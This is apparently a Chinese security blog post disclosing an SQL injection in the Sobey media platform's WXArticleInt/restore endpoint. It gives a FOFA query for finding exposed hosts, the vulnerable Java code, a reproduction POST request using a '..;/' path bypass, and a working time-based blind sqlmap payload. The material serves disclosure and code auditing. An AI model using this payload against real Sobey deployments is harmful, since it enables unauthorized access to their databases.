---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-restore-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintrestore-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/27 08:22
- 688浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

网络安全课程

数据库

恶意软件分析工具

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/restore 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/WXArticleInt/restore`的实现逻辑

```
@RequestMapping(
    value = {"/restore"},
    method = {RequestMethod.POST}
)
public Response restore(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("id") String id) {
    Response response = new Response();
    response.setStatus(200);
    JSONObject userinfo = (JSONObject)this.req.getAttribute("userinfo");

    try {
        QueryBuilder qb = new QueryBuilder("update zcnwxarticle SET ifval='1' where id in (" + id + ")");
        qb.executeNoQuery();
```

代码一看就很明了了，**id**是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&id=SQLI_POC&token=
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入漏洞](images/img-001-f3a2912b4b91.webp)](https://image.mrxn.net/e398e997a1a146e2874d47fc18287e5a.webp)

成功延时 5 秒

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKvUlEQVR4AeyagXLbOAxE8/r//3yXNefJMETJTurEnilvsl1isQAZQmqczv35+Pj477v47+S/R3pa3r1HevU94qn+rK2pHL2i5lybN5bVwzMt+leRgXzWrK93uYFtIJ8T/ngUjxzeXt2rHgY+gM0SLdiEBxbxi25Xl2seuNm75vq618OoVQ8f1SR3D7V2G0gV1/p1N7AbCIzpw57vHROuNXp9Oowrm5NrLmv1GScfwH7P6DPA1WvPme+ZGlz3hNv1bJ/dQGampf3eDTx1ID51YZg/DXCrw2OxVwLDb3zGMLwwOOcSMDTr1Y0rw63XHAwdUPprfupA/vo0q8HHUwYC7D6xHD1x6pWP5lA9cLsH3MazHrU+axg1wGaPHigAl+8Frpx8AEPT+xP8lIH8xMH+1Z4/M5B/9Taf8H3vBpJX8whH++mveZi/3jB0uHKv73Ht61rPjPWcsXV6YJzHONw9xjOOf4aZV23m3w1kZlra793ANhAYTwjc5348GDVdT9yfBuNw8meA0RfY/lmn++Hq6TljGJ7sKWBoemTzYbj1wDwGLN8Y2H04gLm2FX0utoF8rtfXG9zAnzwJ38Wzz+85Zn1hPF09Z024587i+AM9WQcw9oHrWwlD03vG6fE3WG/I2e2+ILcbCIynAQbPzgQjB4P1wIjh+nSZ86mBY49eGB7jGcPwwJ71w8jN9oaRg8HW6A2rydEC48ow+sBgczBiQOmUdwM5da/kj9/AbiB5AgJ3BnafFpKv0FsZ9nVwfXNSX/11nVxwT0s+PpE46DGMsyQnjjwwvIDWHQOXO9klPgX7wvAYh2Fon7bLF4wYrrwbyMX5nn/8E6daA3mzMf+B6+sC17XnzKvWAVcf3P411L3G9vtbtp8M17N0zXjGMOo8jx7jyuZgXpN89WcdLYBRA0S+i/WG3L2i3zVsA8k0ZwAuP8CA7WTdB2weuF1vRQ8s4La27vNA+WaxbhNOFmdeuD3PSZvDlP3Dh6aS2AZStLV84Q1s/3QC86chkxVw64ERm//u9wG3fR7pB6Om7glDg1uuHtfuAcOrXlmPXHN9/SzPekP6zb44/tJAfArkfnb1yjCeQLVaA7c5GDHsudZlPes30+KdAcYevcY4DMMDg6NV1L4wPDDYHIwY9qyn9vzSQGyw+OduYA3k5+72W523gfja2AX2rxjcamc19uke9fBRTr1y/AGMM2TdASNX67LWByMP119m4aoBWh9iYPu4n32Cs8LkZ6g120CquNavu4HdP53MJqjmMY1hPCFdT14NhgcGq58xDC9c+czfc3Ctg+s65xK95kiP7yyXfABjn6wrrA3D8MAtV/96Q+ptvMF6+8UwEww8E9xOEfZ/7+r9CsO+r/XZv0J9xjD6zPxVy9p6GDVw5Udyeh7h7BfA2KPWRA+qljUML/Cc/7f3Y/33tBs4/Csrk+yAMcmuz04Dt96Zp2swamBwzcNeq/m6huGFwf28iau/rpMT6jD6wC3rq2zNjGHUz3JqhwPRsPh3b2AbCMynB0MHtpMB2+dvYNNnC+Di9Smqnq71eObVIz/igXEGuLL1cu3j+iynpzOMPWa1arK1xuFtICYXP+UGvt1kDeTbV/czhdsvhnldAreB21cvuSPA8Fob1pv1V2FtZXvAfi9zX2EYfWCwe8GIga+027z2UQAuf2UDSht3bxLrDcktvBF2AwEuE/WMMGI4Zr2VYfirlrVPRRiGB245vg4YHnUYMdzn7NVhn87Vd5aLD+7v3XskhlGXdQAjBtYvhh9v9t/uDfF8eQIC43DiGZIL4Drp7ks+gKsncYU1MDyznJreGXcPHPezHvYeGJoe+8LQjcN6OifXoafriQ8HkuTC79/A9o+LsJ/60XHgvhfue3xSZBg1xkf7Vx1GDVDlyxq4/Dy0H4wYrnwxfv6h53O5+4KrH9jlqwBc9qza0Rr23vWGHN3Wi/Q1kBdd/NG2u18MfXWBj2BWqKfn1MM9l15BciJxoFfd+BG2Jnzkzx5BPEJv9KDH0brXWLam8lmu+o7W6w05upkX6dtA8kQEnmM26eRnsGbG+me5vseZt+eMZ9z3cp/qVZN7TWL9WQc9jibMdTY/49ne20BmBUv7/RvYPvbOpnV0HL2yvvp0qHWuHtd6ej/1ynrkR3PVl7V7d7Zv5fhnqB7X+owrm+tcPesN6bfz4vhbA/Gp6mevk+65R2L7ztjeZ316Xffao7IeNeOw/XpOPZ6OI29quncWf2sgs0ZLe84NbL+H2C6TrFCv7FOgr+Zc6+mxemX7VK2v9djPuPsS65H1Vjb305zzCPeq58haPbzekNzCG+EFA3mj7/4Nj7J97M2rE/TXy7hyfEHVso7W4fesblw5tUH3GIeTD6zLOjAOxxdkXRFfR3yBvqwD48rRg6plHe07SG3gmWqP9YbkZt4Ihz/Uz87oZPU4YfXKemS94a5Zp24cVpNT32HuiKs/PYMjb/Tkg6wrogUzLXpQc66jB8aexzi83pDcwhth+xnimTLBCqc4Y2vkM0/t6do641n9kdZr7RE2J9sjOWHOWNYb1tM5ucCacOKge5MTyQdnnvWG9Nt5cbwN5GiK6jPOtAO/h5lHTU/8Heb0yuqVzcm1lz5zsvrMa062Jty1Hj/Sz5rK6R2o1T7bQEwufu0NrIG89v53u28fe31t8ioFOtXDXTOecfyBuawD43D2CaIH0YKsg+Q6oleYD1e9rtPzHvSf+bJHMPNED8xlHRiHEwdne603JDf1RtgGkskFTk+uZ1WLr6J6XJs/qknenDVycoH5ymeenkuPI+jtXPfqa73qxo9yr/NstX4bSBXX+nU3cPcXw3o0J+qkZfXqPcvp63XW9Ly+sDk5Wod9ZL2Ve673SKw/66DXmA+bk6MFxuHEQXoF0YJoYr0h3sSb8DaQTGqG2Tkz3YpZnXnr9RhXfsR7Vl97Zd37RevQ8+y+7mNf9wmbO+NtIGemlfu9G9h+D8kEK86O4PTlWufa3CN9uqf3SC81vdHuoddYW1nPrJe56s/6SE+uo/btOftUXm9Iv6UXx2sgpwP4/eTuY69HqK+R66NcfS1dW9Nje8y411SPfdT0zliPNbJ6eKZFn+ER7+wc0Wq/xEHV+nq9If1GXhxvP9R9Cr7Cj5w9T0Sgt/aPHqjpiRYYn7G14e5Lj6DrNU5dEF9H9EC91h2t4w9m+eiBuawD4/B6Q3ILb4RtID4Fj3A/vzVdT5wnIMg60BtOPEP8wSzXtfQRPXcWH9VkX2F9j9VnfNS3eu2n1zi8DaQWrPXrbmA3kEzpCM8+pvvYt8fqM9Y7Y/3mjM/4zDt7kuOv/RLPUD32UdOvHt4NRPPi19zAGshr7v1w16cMxFfvcJfPhJ7Kn/LlK69qcAk+/8g6+FwefiXfcWTW95W9rQlbd9S/6vEHalkL+/ScevgpA3GDxX9/Az8+EJ8Oj2ocVsuTEUQLsg7Mh6MHWQfJdyRfEV+gr+bUkq9Qr1zz99bWudc9f/J6wz8+kGy48PgN7AaSKR3hqK3+mvdJqVrW6uHEZ7BvWF/WgXHl9AzU4guMkxNdM55xelScecz1faLXHllHC/SGdwOJYeF1N7ANJNN5FF85rj3zRBzhqJ+14e6xV9drnLqgan191sdcelSo9173Ynt0n/3C20C6acWvuYE1kNfc++Gu/wMAAP//UumYVAAAAAZJREFUAwBkwj+zmruBHgAAAABJRU5ErkJggg==)

手机扫码阅读
